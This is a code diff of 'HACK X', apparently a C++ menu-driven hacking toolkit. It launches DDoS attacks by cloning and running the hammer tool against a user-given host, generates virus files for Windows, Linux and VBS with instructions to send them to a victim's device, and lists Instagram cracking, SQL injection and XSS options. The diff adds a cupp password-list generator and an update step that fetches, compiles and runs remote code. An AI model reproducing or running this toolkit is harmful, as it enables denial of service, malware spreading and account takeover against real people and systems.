@@ -16,17 +16,26 @@ int main(){
 		std::this_thread::sleep_for(times);
 	system("clear");
 	cout << "HACK X" << endl;
-	cout << "| \033[1;32m1)Attack DDOS\033[1;m" << "\n| \033[1;32m2)Create the Virus\033[1;m" << "\n| \033[1;32m3)Get Proxy\033[1;m" << "\n| \033[1;32m4)Cracker Instagram\033[1;m" << "\n| \033[1;32m5)Find the Username of the Admin Website\033[1;m" << "\n| \033[1;32m6)Find IP Website\033[1;m" << "\n| \033[1;32m7)Attack SQL Injection\033[1;m" << "\n| \033[1;32m8)Website Template\033[1;m" << "\n| \033[1;32m9)Attack XSS\033[1;m";
-	cout << "\n\n| \033[1;34m10)Debug\033[1;m" << "\n| \033[1;34m11)Change Password Router\033[1;m" << "\n| \033[1;34m12)Go to DarkWeb\033[1;m";
+	cout << "| \033[1;32m1)Attack DDOS\033[1;m" << "\n| \033[1;32m2)Create the Virus\033[1;m" << "\n| \033[1;32m3)Get Proxy\033[1;m" << "\n| \033[1;32m4)Cracker Instagram\033[1;m" << "\n| \033[1;32m5)Find the Username of the Admin Website\033[1;m" << "\n| \033[1;32m6)Find IP Website\033[1;m" << "\n| \033[1;32m7)Attack SQL Injection\033[1;m" << "\n| \033[1;32m8)Website Template\033[1;m" << "\n| \033[1;32m9)Attack XSS\033[1;m" << "\n| \033[1;32m10)Create Paassword List\033[1;m";
+	cout << "\n\n| \033[1;34m50)Debug\033[1;m" << "\n| \033[1;34m51)Change Password Router\033[1;m" << "\n| \033[1;34m52)Go to DarkWeb\033[1;m";
 	
 	cout << string(7 , '\n'); 
-	cout << "\033[1;36m99)About_______________________________________100)Update\033[1;m" << endl;
+	cout << "\033[1;36m99)About_________________________________100)Update\033[1;m" << endl;
 	cout << "\n \nPlease Enter Number:";
 	cin >> n;
 	if(1 == n){
 		string s;
 		string str;
 		string spam;
+		system("apt-get install python3");
+		system("packman install python3");
+		system("pkg install python3");
+		system("yum install python3");
+		system("dnf install python3");
+		system("pacman -S python3");
+		system("pkg install python3");
+		system("pkg install python");
+		system("pkg_add python3");
 		system("apt-get install git");
 		system("packman install git");
 		system("pkg install git");
@@ -35,7 +44,7 @@ int main(){
 		system("pacman -S git");
 		system("pkg install git");
 		system("pkg_add git");
-		system("git clone https://github.com/cyweb/hammer.git");
+ 		system("git clone https://github.com/cyweb/hammer.git");
 		system("mv ~/hackX/hammer/hammer.py ~/hackX/");
 		system("mv ~/hackX/hammer/headers.txt ~/hackX/");
 		system("mv ~/hackX/hammer/README.md ~/hackX/");
@@ -44,8 +53,11 @@ int main(){
  		cin >> s;	
 		cout << "Please Enter Port Number:";
 		cin >> spam;
+		str="python hammer.py -s "+s+" -p"+spam;
 		str="python3 hammer.py -s "+s+" -p"+spam;
 		
+
+
 		const char *commands = str.c_str();
 			
 		system (commands);
@@ -99,6 +111,7 @@ int main(){
 			system("mv ~/hackX/hi.txt ~/hackX/Output/vpn.bat");
 			system("rm -rf virusWindows.cpp");
 			system("g++ hackx.cpp");
+			system("clang++ hackx.cpp");
 			system("mv ~/hackX/a.out ~/hackX/hackx.run");
 			cout << "  \033[1;32mCreated virus for Windows\033[1;m";
 			system("echo '\033[1;36mHelp: File Name is vpn.bat and Must you send virus a device \033[1;m'");
@@ -142,6 +155,7 @@ int main(){
 			system("mkdir Output");
 			system("mv ~/hackX/virusError.vbs ~/hackX/Output/Messager.vbs");
 			system("g++ hackx.cpp");
+			system("clang++ hackx.cpp");
 			system("mv ~/hackX/a.out ~/hackX/hackx.run");
 			cout << "  \033[1;32mCreated virus for Messager\033[1;m";
 			system("echo '\033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m'");
@@ -155,6 +169,7 @@ int main(){
 			system("mkdir Output");
 			system("mv ~/hackX/virusVoice.vbs ~/hackX/Output/Voice.vbs");
 			system("g++ hackx.cpp");
+			system("clang++ hackx.cpp");
 			system("mv ~/hackX/a.out ~/hackX/hackx.run");
 			cout << "  \033[1;32mCreated virus for Voice\033[1;m";
 			system("echo '\033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m'");
@@ -190,6 +205,7 @@ int main(){
 			system("mv ~/hackX/a.out ~/hackX/Output/vpn.run");
 			system("rm -rf virusLinux.cpp");
 			system("g++ hackx.cpp");
+			system("clang++ hackx.cpp");
 			system("mv ~/hackX/a.out ~/hackX/hackx.run");
 			cout << "  \033[1;32mcreated virus for Linux\033[1;m";
 			system("echo '\033[1;36mhelp: File Name is vpn.run and Must you send virus a device\033[1;m'");
@@ -455,13 +471,51 @@ int main(){
 		cout << "Bye";
 	}
 	else if(10 == n){
+		system("apt-get install python3");
+		system("packman install python3");
+		system("pkg install python");
+		system("pkg install python3");
+		system("yum install python3");
+		system("dnf install python3");
+		system("pacman -S python3");
+		system("pkg install python3");
+		system("pkg_add python2");
+		system("apt-get install git");
+		system("packman install git");
+		system("pkg install git");
+		system("yum install git");
+		system("dnf install git");
+		system("pacman -S git");
+		system("pkg install git");
+		system("pkg_add git");
+		system("git clone https://github.com/Mebus/cupp.git");
+		system("mv ~/hackX/cupp/CHANGELOG.md ~/hackX/");
+		system("mv ~/hackX/cupp/cupp.cfg ~/hackX/");
+		system("mv ~/hackX/cupp/cupp.py ~/hackX/");
+		system("mv ~/hackX/cupp/LICENSE ~/hackX/");
+		system("mv ~/hackX/cupp/README.md ~/hackX/");
+		system("mv ~/hackX/cupp/test_cupp.py ~/hackX/");
+		system("clear");
+		system("./cupp.py -i");
+		system("rm -rf cupp");
+		system("rm -rf CHANGELOG.md");
+		system("rm -rf cupp.cfg");
+		system("rm -rf cupp.py");
+		system("rm -rf LICENSE");
+		system("rm -rf README.md");
+		system("rm -rf test_cupp.py");
+		printf("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
+		cout << __TIME__ << "\n";
+		cout << "Bye";
+	}
+	else if(50 == n){
 		system("rm -rf /var/cache/apt/archives/lock");
 		system("clear");
 		printf("Debug Successful\n \a");
 		cout << __TIME__ << "\n";
 		cout << "Bye";
 	}
-	else if(11 == n){
+	else if(51 == n){
 		printf("Other 5 Seconds To Browser Firefox\n");
 		std::chrono::seconds timessss(5);
 		std::this_thread::sleep_for(timessss);	
@@ -475,7 +529,7 @@ int main(){
 		cout << __TIME__ << "\n";
 		cout << "Bye";
 	}
-	else if(12 == n){
+	else if(52 == n){
 		system("wget https://github.com/TheTorProject/gettorbrowser/releases/download/v8.0.2/tor-browser-linux64-8.0.2_en-US.tar.xz");
 		system("tar -xf tor-browser-linux64-8.0.2_en-US.tar.xz");
 		system("mv ~/hackX/tor-browser_en-US/Browser/abicheck ~/hackX/");
@@ -580,22 +634,28 @@ int main(){
 		cout << string(6 , '\n');
 		cout << "                           Designer:Cunknown" << endl;
 		cout << "                           Programmer:Cunknown" << endl;
-		printf("                           \033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
-		cout << "                          " << __TIME__ << "\n";
+		printf("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
+		cout << __TIME__ << "\n";
 		cout << "Bye";
 	}
 	else if(100 == n){
-		printf("\033[1;32m((((([[[[[[Coming Soon is Create]]]]])))))\033[1;m\n \a");
-		cout << __TIME__ << "\n";
-		cout << "Bye";
+		
+		system("git clone http://github.com/anonymous14725/hackX.git");
+		system("mv ~/hackX/hackX/hackx.run ~/hackX");
+		system("mv ~/hackX/hackX/Data.zip ~/hackX");
+		system("mv ~/hackX/hackX/hackx.cpp ~/hackX");
+		system("unzip Data.zip");
+		system("chmod +x hackx.run");
+		system("rm -rf hackX");
+		system("rm -rf Data.zip");
+		system("clang++ hackx.cpp");
+		system("./a.out");
 	}
 	else{
 		printf("\033[1;31m((((([[[[[[Unsuccess In Load]]]]])))))\033[1;m\n \a");
 		cout << __TIME__ << "\n";
 		cout << "Bye";
 	}
-	__asm__("int3");
-	__asm__("ret");
 	
 	return 0;
 }
